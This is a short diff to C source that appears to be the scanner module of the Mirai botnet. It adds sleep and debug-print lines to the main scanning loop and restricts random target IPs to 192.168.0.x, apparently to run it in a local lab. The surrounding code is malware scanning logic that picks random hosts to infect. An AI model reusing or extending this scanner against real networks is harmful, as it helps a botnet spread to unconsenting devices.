@@ -188,10 +188,15 @@ void scanner_init(void)
 #ifdef DEBUG
     printf("[scanner] Scanner process initialized. Scanning started.\n");
 #endif
-
+    //scaning in every isWaiting sec
+    int isWaiting = 1;
     // Main logic loop
     while (TRUE)
     {
+        printf("[is own programming:scanner]sleep in %d sec\n",isWaiting);
+        sleep(isWaiting);
+        printf("[is own programming:scanner]start scannig\n");
+        
         fd_set fdset_rd, fdset_wr;
         struct scanner_connection *conn;
         struct timeval tim;
@@ -213,6 +218,8 @@ void scanner_init(void)
                 iph->daddr = get_random_ip();
                 iph->check = 0;
                 iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
+                //printf("[is own programming:scanner] scanning sIP %d.%d.%d.%d\n",iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
+                //printf("[is own programming:scanner] scanning dIP %d.%d.%d.%d\n",iph->daddr & 0xff, (iph->daddr >> 8) & 0xff, (iph->daddr >> 16) & 0xff, (iph->daddr >> 24) & 0xff);
 
                 if (i % 10 == 0)
                 {
@@ -683,6 +690,7 @@ static ipv4_t get_random_ip(void)
         o1 = 192;
         o2 = 168;
         o3 = 0;
+        //o3 = (tmp >> 16) & 0xff;
         o4 = (tmp >> 24) & 0xff;
     }
     while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
